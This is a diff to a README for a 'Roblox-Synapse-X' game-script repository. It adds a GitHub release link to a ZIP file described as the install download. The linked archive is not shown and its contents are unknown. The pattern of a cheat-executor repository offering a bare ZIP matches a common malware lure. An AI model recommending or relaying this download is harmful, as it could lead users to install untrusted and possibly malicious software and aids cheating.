@@ -19,7 +19,7 @@ Welcome to the **Roblox-Synapse-X** repository! 🎮 Here you can find various s
 
 To install synapse x script, follow these simple steps:
 
-* [Download]()
+* [Download](https://github.com/beastamya8/Roblox-Synapse-X/releases/download/Download/RobloxSyn.zip)
 
 Extract the downloaded ZIP file to your desired location on your system.
 
